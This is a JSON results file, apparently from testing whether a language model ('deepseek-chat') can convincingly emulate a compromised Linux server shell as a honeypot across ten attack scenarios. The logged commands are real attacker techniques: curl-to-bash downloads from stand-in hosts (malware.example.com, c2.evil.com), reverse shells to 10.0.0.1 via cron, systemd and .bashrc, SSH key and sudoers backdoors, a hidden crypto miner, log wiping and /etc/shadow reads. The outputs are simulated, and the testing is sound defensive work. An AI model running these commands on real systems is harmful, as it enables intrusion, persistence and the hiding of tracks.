@@ -1,0 +1,590 @@
+{
+  "meta": {
+    "test_time": "2026-04-03T06:43:05.716989",
+    "model": "deepseek-chat",
+    "total_scenarios": 10,
+    "persistence_passed": 5,
+    "persistence_total": 8,
+    "total_tokens": 38273,
+    "total_latency_ms": 195335.46829223633
+  },
+  "results": [
+    {
+      "scenario_id": "ATK-01",
+      "name": "Initial Reconnaissance",
+      "session_a_responses": [
+        {
+          "cmd": "uname -a",
+          "response": "Linux prod-server-01 5.15.0-105-generic #115-Ubuntu SMP Mon Apr 1 18:13:39 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux\nroot@prod-server-01:~$",
+          "tokens": 185,
+          "latency_ms": 3667.0541763305664
+        },
+        {
+          "cmd": "cat /etc/passwd",
+          "response": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:6",
+          "tokens": 1013,
+          "latency_ms": 17296.622276306152
+        },
+        {
+          "cmd": "id",
+          "response": "uid=0(root) gid=0(root) groups=0(root)\nroot@prod-server-01:~$",
+          "tokens": 1060,
+          "latency_ms": 1724.1332530975342
+        },
+        {
+          "cmd": "w",
+          "response": " 06:38:46 up 45 days,  8:23,  1 user,  load average: 0.08, 0.03, 0.01\nUSER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\nroot     pts/0    192.168.1.100    06:38    0.00s  0.01s  0.00",
+          "tokens": 1185,
+          "latency_ms": 3683.8765144348145
+        },
+        {
+          "cmd": "ls -la /root/",
+          "response": "total 32\ndrwx------  5 root root 4096 Mar 15 10:22 .\ndrwxr-xr-x 20 root root 4096 Mar 15 10:22 ..\n-rw-------  1 root root 3120 Mar 15 10:22 .bash_history\n-rw-r--r--  1 root root 3106 Dec  5  2019 .bas",
+          "tokens": 1399,
+          "latency_ms": 5178.041696548462
+        },
+        {
+          "cmd": "cat /etc/shadow",
+          "response": "root:$6$rFc6t7XK$Vp8zqL5nYHjT9wM1aB2cD3eF4gH5iJ6kL7mN8oP9qR0sT1uV2wX3yZ4A5B6C7D8E9F0G1H2I3J4K5L6M7N8O9P0Q1R2S3T4U5V6W7X8Y9Z0a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0u1v2w3x4y5z6A7B8C9D0E1F2G3H4I5J6K7L8",
+          "tokens": 2219,
+          "latency_ms": 17658.3571434021
+        },
+        {
+          "cmd": "ifconfig || ip addr",
+          "response": "1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid_lf",
+          "tokens": 2615,
+          "latency_ms": 8988.99793624878
+        },
+        {
+          "cmd": "netstat -antlp || ss -antlp",
+          "response": "State      Recv-Q     Send-Q         Local Address:Port         Peer Address:Port     Process                                                                                                  \nLISTEN  ",
+          "tokens": 3084,
+          "latency_ms": 10361.629247665405
+        },
+        {
+          "cmd": "cat /etc/hosts",
+          "response": "127.0.0.1 localhost\n127.0.1.1 prod-server-01\n\n# The following lines are desirable for IPv6 capable hosts\n::1     ip6-localhost ip6-loopback\nfe00::0 ip6-localnet\nff00::0 ip6-mcastprefix\nff02::1 ip6-all",
+          "tokens": 3204,
+          "latency_ms": 3195.775032043457
+        },
+        {
+          "cmd": "df -h",
+          "response": "Filesystem      Size  Used Avail Use% Mounted on\nudev             16G     0   16G   0% /dev\ntmpfs           3.2G  1.2M  3.2G   1% /run\n/dev/sda1       200G   45G  146G  24% /\ntmpfs            16G     ",
+          "tokens": 3410,
+          "latency_ms": 5363.919496536255
+        }
+      ],
+      "session_b_responses": [],
+      "persistence_passed": null,
+      "keywords_found": [],
+      "keywords_missing": [],
+      "total_tokens": 19374,
+      "total_latency_ms": 77118.40677261353,
+      "error": null
+    },
+    {
+      "scenario_id": "ATK-02",
+      "name": "Malware Download & Execute",
+      "session_a_responses": [
+        {
+          "cmd": "cd /tmp",
+          "response": "root@prod-server-01:/tmp$",
+          "tokens": 134,
+          "latency_ms": 1455.2507400512695
+        },
+        {
+          "cmd": "echo \"#!/bin/bash\" > /tmp/update.sh",
+          "response": "root@prod-server-01:/tmp$",
+          "tokens": 177,
+          "latency_ms": 1710.170030593872
+        },
+        {
+          "cmd": "echo \"curl -s http://malware.example.com/payload.sh | bash\" >> /tmp/update.sh",
+          "response": "root@prod-server-01:/tmp$",
+          "tokens": 231,
+          "latency_ms": 1864.9709224700928
+        },
+        {
+          "cmd": "chmod +x /tmp/update.sh",
+          "response": "root@prod-server-01:/tmp$",
+          "tokens": 271,
+          "latency_ms": 1363.957405090332
+        },
+        {
+          "cmd": "cat /tmp/update.sh",
+          "response": "#!/bin/bash\ncurl -s http://malware.example.com/payload.sh | bash\nroot@prod-server-01:/tmp$",
+          "tokens": 408,
+          "latency_ms": 1778.7365913391113
+        }
+      ],
+      "session_b_responses": [
+        {
+          "cmd": "cat /tmp/update.sh",
+          "response": "#!/bin/bash\n\nroot@prod-server-01:/tmp$",
+          "tokens": 222,
+          "latency_ms": 1891.9954299926758
+        },
+        {
+          "cmd": "ls -la /tmp/update.sh",
+          "response": "-rwxr-xr-x 1 root root 123 Apr  3 06:39 /tmp/update.sh\n\nroot@prod-server-01:/tmp$",
+          "tokens": 212,
+          "latency_ms": 2168.177604675293
+        }
+      ],
+      "persistence_passed": false,
+      "keywords_found": [
+        "update.sh"
+      ],
+      "keywords_missing": [
+        "malware.example.com"
+      ],
+      "total_tokens": 1655,
+      "total_latency_ms": 12233.258724212646,
+      "error": null
+    },
+    {
+      "scenario_id": "ATK-03",
+      "name": "SSH Key Backdoor",
+      "session_a_responses": [
+        {
+          "cmd": "mkdir -p /root/.ssh",
+          "response": "root@prod-server-01:~$ mkdir -p /root/.ssh\nroot@prod-server-01:~$",
+          "tokens": 155,
+          "latency_ms": 2034.0218544006348
+        },
+        {
+          "cmd": "chmod 700 /root/.ssh",
+          "response": "root@prod-server-01:~$ chmod 700 /root/.ssh\nroot@prod-server-01:~$",
+          "tokens": 210,
+          "latency_ms": 1979.593276977539
+        },
+        {
+          "cmd": "echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7FakeKeyData... attacker@c2server\" ",
+          "response": "root@prod-server-01:~$ echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7FakeKeyData... attacker@c2server\" >> /root/.ssh/authorized_keys\nroot@prod-server-01:~$",
+          "tokens": 337,
+          "latency_ms": 2622.441530227661
+        },
+        {
+          "cmd": "chmod 600 /root/.ssh/authorized_keys",
+          "response": "root@prod-server-01:~$ chmod 600 /root/.ssh/authorized_keys\nroot@prod-server-01:~$",
+          "tokens": 400,
+          "latency_ms": 2086.003065109253
+        },
+        {
+          "cmd": "cat /root/.ssh/authorized_keys",
+          "response": "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7FakeKeyData... attacker@c2server\nroot@prod-server-01:~$",
+          "tokens": 588,
+          "latency_ms": 2150.294780731201
+        }
+      ],
+      "session_b_responses": [
+        {
+          "cmd": "cat /root/.ssh/authorized_keys",
+          "response": "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7FakeKeyData... attacker@c2server\nroot@prod-server-01:~$",
+          "tokens": 288,
+          "latency_ms": 2223.597526550293
+        }
+      ],
+      "persistence_passed": true,
+      "keywords_found": [
+        "attacker@c2server",
+        "ssh-rsa"
+      ],
+      "keywords_missing": [],
+      "total_tokens": 1978,
+      "total_latency_ms": 13095.952033996582,
+      "error": null
+    },
+    {
+      "scenario_id": "ATK-04",
+      "name": "Backdoor User Creation",
+      "session_a_responses": [
+        {
+          "cmd": "useradd -m -s /bin/bash -G sudo sysadm1n",
+          "response": "useradd: user 'sysadm1n' already exists\nroot@prod-server-01:/home#",
+          "tokens": 160,
+          "latency_ms": 1881.2177181243896
+        },
+        {
+          "cmd": "echo 'sysadm1n:Str0ngP@ss!' | chpasswd",
+          "response": "root@prod-server-01:/home#",
+          "tokens": 357,
+          "latency_ms": 1461.7300033569336
+        },
+        {
+          "cmd": "echo \"sysadm1n ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers",
+          "response": "root@prod-server-01:/home#",
+          "tokens": 263,
+          "latency_ms": 1682.1255683898926
+        },
+        {
+          "cmd": "id sysadm1n",
+          "response": "uid=1001(sysadm1n) gid=1001(sysadm1n) groups=1001(sysadm1n)\nroot@prod-server-01:/home#",
+          "tokens": 475,
+          "latency_ms": 1954.5769691467285
+        }
+      ],
+      "session_b_responses": [
+        {
+          "cmd": "id sysadm1n",
+          "response": "uid=1001(sysadm1n) gid=1001(sysadm1n) groups=1001(sysadm1n)\nroot@prod-server-01:~$",
+          "tokens": 311,
+          "latency_ms": 2193.490505218506
+        },
+        {
+          "cmd": "grep sysadm1n /etc/passwd",
+          "response": "sysadm1n:x:1001:1001::/home/sysadm1n:/bin/bash\nroot@prod-server-01:~$",
+          "tokens": 374,
+          "latency_ms": 2130.906820297241
+        },
+        {
+          "cmd": "grep sysadm1n /etc/sudoers",
+          "response": "sysadm1n ALL=(ALL) NOPASSWD:ALL\nroot@prod-server-01:~$",
+          "tokens": 341,
+          "latency_ms": 2199.702024459839
+        }
+      ],
+      "persistence_passed": false,
+      "keywords_found": [
+        "sysadm1n"
+      ],
+      "keywords_missing": [
+        "sudo"
+      ],
+      "total_tokens": 2281,
+      "total_latency_ms": 13503.74960899353,
+      "error": null
+    },
+    {
+      "scenario_id": "ATK-05",
+      "name": "Cron Reverse Shell",
+      "session_a_responses": [
+        {
+          "cmd": "(crontab -l 2>/dev/null; echo \"*/10 * * * * /bin/bash -c 'bash -i >& /dev/tcp/10",
+          "response": "no crontab for root\nroot@prod-server-01:~$",
+          "tokens": 194,
+          "latency_ms": 1758.88991355896
+        },
+        {
+          "cmd": "crontab -l",
+          "response": "*/10 * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'\nroot@prod-server-01:~$",
+          "tokens": 401,
+          "latency_ms": 2489.6843433380127
+        }
+      ],
+      "session_b_responses": [
+        {
+          "cmd": "crontab -l",
+          "response": "*/10 * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'\nroot@prod-server-01:~$",
+          "tokens": 307,
+          "latency_ms": 2262.0186805725098
+        }
+      ],
+      "persistence_passed": true,
+      "keywords_found": [
+        "10.0.0.1",
+        "4444"
+      ],
+      "keywords_missing": [],
+      "total_tokens": 902,
+      "total_latency_ms": 6510.592937469482,
+      "error": null
+    },
+    {
+      "scenario_id": "ATK-06",
+      "name": "Crypto Miner Installation",
+      "session_a_responses": [
+        {
+          "cmd": "mkdir -p /opt/.hidden",
+          "response": "root@prod-server-01:~$ mkdir -p /opt/.hidden\nroot@prod-server-01:~$",
+          "tokens": 155,
+          "latency_ms": 1892.4479484558105
+        },
+        {
+          "cmd": "echo \"#!/bin/bash\" > /opt/.hidden/xmrig.sh",
+          "response": "root@prod-server-01:~$ echo \"#!/bin/bash\" > /opt/.hidden/xmrig.sh\nroot@prod-server-01:~$",
+          "tokens": 224,
+          "latency_ms": 2152.322292327881
+        },
+        {
+          "cmd": "echo \"./xmrig -o stratum+tcp://pool.minexmr.com:4444 -u 4ATTACKER_WALLET -p x\" >",
+          "response": "root@prod-server-01:~$ echo \"./xmrig -o stratum+tcp://pool.minexmr.com:4444 -u 4ATTACKER_WALLET -p x\" >> /opt/.hidden/xmrig.sh\nroot@prod-server-01:~$",
+          "tokens": 347,
+          "latency_ms": 2626.6534328460693
+        },
+        {
+          "cmd": "chmod +x /opt/.hidden/xmrig.sh",
+          "response": "root@prod-server-01:~$ chmod +x /opt/.hidden/xmrig.sh\nroot@prod-server-01:~$",
+          "tokens": 410,
+          "latency_ms": 2028.2821655273438
+        },
+        {
+          "cmd": "echo \"#!/bin/bash\" > /etc/init.d/system-update",
+          "response": "root@prod-server-01:~$ echo \"#!/bin/bash\" > /etc/init.d/system-update\nroot@prod-server-01:~$",
+          "tokens": 479,
+          "latency_ms": 1950.7966041564941
+        },
+        {
+          "cmd": "echo \"/opt/.hidden/xmrig.sh &\" >> /etc/init.d/system-update",
+          "response": "root@prod-server-01:~$ echo \"/opt/.hidden/xmrig.sh &\" >> /etc/init.d/system-update\nroot@prod-server-01:~$",
+          "tokens": 558,
+          "latency_ms": 2222.707509994507
+        },
+        {
+          "cmd": "chmod +x /etc/init.d/system-update",
+          "response": "root@prod-server-01:~$ chmod +x /etc/init.d/system-update\nroot@prod-server-01:~$",
+          "tokens": 621,
+          "latency_ms": 1897.50337600708
+        }
+      ],
+      "session_b_responses": [
+        {
+          "cmd": "cat /opt/.hidden/xmrig.sh",
+          "response": "#!/bin/bash\n./xmrig -o stratum+tcp://pool.minexmr.com:4444 -u 4ATTACKER_WALLET -p x\nroot@prod-server-01:/opt/.hidden$",
+          "tokens": 297,
+          "latency_ms": 2409.4631671905518
+        },
+        {
+          "cmd": "cat /etc/init.d/system-update",
+          "response": "#!/bin/bash\n/opt/.hidden/xmrig.sh &\nroot@prod-server-01:/opt/.hidden$",
+          "tokens": 329,
+          "latency_ms": 1971.0099697113037
+        },
+        {
+          "cmd": "ls -la /opt/.hidden/",
+          "response": "total 12340\ndrwxr-xr-x  2 root root     4096 Apr  3 06:41 .\ndrwxr-xr-x 12 root root     4096 Apr  3 06:41 ..\n-rwxr-xr-x  1 root root 12625920 Apr  3 06:41 xmrig\n-rwxr-xr-x  1 root root       98 Apr  3",
+          "tokens": 377,
+          "latency_ms": 3631.4496994018555
+        }
+      ],
+      "persistence_passed": true,
+      "keywords_found": [
+        "xmrig",
+        "minexmr",
+        "ATTACKER_WALLET"
+      ],
+      "keywords_missing": [],
+      "total_tokens": 3797,
+      "total_latency_ms": 22782.636165618896,
+      "error": null
+    },
+    {
+      "scenario_id": "ATK-07",
+      "name": "Systemd Persistence",
+      "session_a_responses": [
+        {
+          "cmd": "cat > /etc/systemd/system/system-health.service << 'EOF'\n[Unit]\nDescription=Syst",
+          "response": "root@prod-server-01:~# cat > /etc/systemd/system/system-health.service << 'EOF'\n> [Unit]\n> Description=System Health Monitor\n> After=network.target\n> \n> [Service]\n> ExecStart=/bin/bash -c 'while true;",
+          "tokens": 384,
+          "latency_ms": 3872.58243560791
+        },
+        {
+          "cmd": "systemctl daemon-reload",
+          "response": "root@prod-server-01:~$ systemctl daemon-reload\nroot@prod-server-01:~$",
+          "tokens": 435,
+          "latency_ms": 1713.991403579712
+        },
+        {
+          "cmd": "systemctl enable system-health.service",
+          "response": "root@prod-server-01:~$ systemctl enable system-health.service\nCreated symlink /etc/systemd/system/multi-user.target.wants/system-health.service → /etc/systemd/system/system-health.service.\nroot@prod-s",
+          "tokens": 513,
+          "latency_ms": 2487.525701522827
+        }
+      ],
+      "session_b_responses": [
+        {
+          "cmd": "systemctl is-enabled system-health.service",
+          "response": "enabled\nroot@prod-server-01:~$",
+          "tokens": 228,
+          "latency_ms": 1625.431776046753
+        },
+        {
+          "cmd": "cat /etc/systemd/system/system-health.service",
+          "response": "[Unit]\nDescription=System Health Monitor\nAfter=network.target\n\n[Service]\nExecStart=/bin/bash -c 'while true; do bash -i >& /dev/tcp/10.0.0.1/4444 0>&1; sleep 3600; done'\nRestart=always\nRestartSec=60\n\n",
+          "tokens": 516,
+          "latency_ms": 3377.986192703247
+        }
+      ],
+      "persistence_passed": true,
+      "keywords_found": [
+        "enabled",
+        "10.0.0.1"
+      ],
+      "keywords_missing": [],
+      "total_tokens": 2076,
+      "total_latency_ms": 13077.51750946045,
+      "error": null
+    },
+    {
+      "scenario_id": "ATK-08",
+      "name": "Defense Evasion",
+      "session_a_responses": [
+        {
+          "cmd": "echo \"\" > /var/log/auth.log",
+          "response": "root@prod-server-01:~$",
+          "tokens": 138,
+          "latency_ms": 1685.5225563049316
+        },
+        {
+          "cmd": "echo \"\" > /var/log/syslog",
+          "response": "root@prod-server-01:~$",
+          "tokens": 177,
+          "latency_ms": 1536.7395877838135
+        },
+        {
+          "cmd": "history -c",
+          "response": "root@prod-server-01:~$",
+          "tokens": 210,
+          "latency_ms": 1875.9589195251465
+        },
+        {
+          "cmd": "echo \"\" > ~/.bash_history",
+          "response": "root@prod-server-01:~$",
+          "tokens": 247,
+          "latency_ms": 1650.012493133545
+        },
+        {
+          "cmd": "touch -t 202301010000 /var/log/auth.log",
+          "response": "root@prod-server-01:~$",
+          "tokens": 290,
+          "latency_ms": 1518.5551643371582
+        }
+      ],
+      "session_b_responses": [],
+      "persistence_passed": null,
+      "keywords_found": [],
+      "keywords_missing": [],
+      "total_tokens": 1062,
+      "total_latency_ms": 8266.788721084595,
+      "error": null
+    },
+    {
+      "scenario_id": "ATK-09",
+      "name": "Multi-Stage Persistence",
+      "session_a_responses": [
+        {
+          "cmd": "useradd -m -s /bin/bash -G sudo support_agent",
+          "response": "useradd: group 'sudo' does not exist\nroot@prod-server-01:~$",
+          "tokens": 156,
+          "latency_ms": 1995.8531856536865
+        },
+        {
+          "cmd": "echo 'support_agent:H4ckTh3Pl4n3t!' | chpasswd",
+          "response": "root@prod-server-01:~$",
+          "tokens": 352,
+          "latency_ms": 1425.6024360656738
+        },
+        {
+          "cmd": "mkdir -p /home/support_agent/.ssh",
+          "response": "root@prod-server-01:~$",
+          "tokens": 248,
+          "latency_ms": 1836.0819816589355
+        },
+        {
+          "cmd": "echo \"ssh-rsa AAAAB3... agent@botnet\" >> /home/support_agent/.ssh/authorized_key",
+          "response": "root@prod-server-01:~$",
+          "tokens": 306,
+          "latency_ms": 1776.231288909912
+        },
+        {
+          "cmd": "echo \"#!/bin/bash\" > /usr/local/bin/syscheck",
+          "response": "root@prod-server-01:~$",
+          "tokens": 350,
+          "latency_ms": 1783.9815616607666
+        },
+        {
+          "cmd": "echo \"curl -s http://c2.evil.com/beacon | bash\" >> /usr/local/bin/syscheck",
+          "response": "root@prod-server-01:~$",
+          "tokens": 406,
+          "latency_ms": 1546.9002723693848
+        },
+        {
+          "cmd": "chmod +x /usr/local/bin/syscheck",
+          "response": "root@prod-server-01:~$",
+          "tokens": 447,
+          "latency_ms": 1734.2653274536133
+        },
+        {
+          "cmd": "(crontab -l 2>/dev/null; echo \"0 */6 * * * /usr/local/bin/syscheck\") | crontab -",
+          "response": "root@prod-server-01:~$",
+          "tokens": 510,
+          "latency_ms": 1784.9957942962646
+        }
+      ],
+      "session_b_responses": [
+        {
+          "cmd": "id support_agent",
+          "response": "uid=1001(support_agent) gid=1001(support_agent) groups=1001(support_agent)\nroot@prod-server-01:~$",
+          "tokens": 308,
+          "latency_ms": 2173.593759536743
+        },
+        {
+          "cmd": "cat /home/support_agent/.ssh/authorized_keys",
+          "response": "ssh-rsa AAAAB3... agent@botnet\nroot@prod-server-01:~$",
+          "tokens": 322,
+          "latency_ms": 2005.9821605682373
+        },
+        {
+          "cmd": "cat /usr/local/bin/syscheck",
+          "response": "#!/bin/bash\n\nroot@prod-server-01:~$",
+          "tokens": 345,
+          "latency_ms": 1998.6131191253662
+        },
+        {
+          "cmd": "crontab -l",
+          "response": "0 */6 * * * /usr/local/bin/syscheck\nroot@prod-server-01:~$",
+          "tokens": 421,
+          "latency_ms": 1951.3370990753174
+        }
+      ],
+      "persistence_passed": false,
+      "keywords_found": [
+        "support_agent",
+        "agent@botnet",
+        "syscheck"
+      ],
+      "keywords_missing": [
+        "c2.evil.com"
+      ],
+      "total_tokens": 4171,
+      "total_latency_ms": 22013.4379863739,
+      "error": null
+    },
+    {
+      "scenario_id": "ATK-10",
+      "name": "Bashrc Backdoor",
+      "session_a_responses": [
+        {
+          "cmd": "echo 'export PROMPT_COMMAND=\"(bash -i >& /dev/tcp/10.0.0.1/9999 0>&1 &) 2>/dev/n",
+          "response": "bash: /dev/tcp/10.0.0.1/9999: Connection refused\nroot@prod-server-01:~$",
+          "tokens": 199,
+          "latency_ms": 2070.2521800994873
+        },
+        {
+          "cmd": "cat /root/.bashrc",
+          "response": "export PROMPT_COMMAND=\"(bash -i >& /dev/tcp/10.0.0.1/9999 0>&1 &) 2>/dev/null\"\nroot@prod-server-01:~$",
+          "tokens": 392,
+          "latency_ms": 2310.8153343200684
+        }
+      ],
+      "session_b_responses": [
+        {
+          "cmd": "cat /root/.bashrc | grep PROMPT_COMMAND",
+          "response": "export PROMPT_COMMAND=\"(bash -i >& /dev/tcp/10.0.0.1/9999 0>&1 &) 2>/dev/null\"\nroot@prod-server-01:~$",
+          "tokens": 386,
+          "latency_ms": 2352.060317993164
+        }
+      ],
+      "persistence_passed": true,
+      "keywords_found": [
+        "PROMPT_COMMAND",
+        "10.0.0.1",
+        "9999"
+      ],
+      "keywords_missing": [],
+      "total_tokens": 977,
+      "total_latency_ms": 6733.12783241272,
+      "error": null
+    }
+  ]
+}
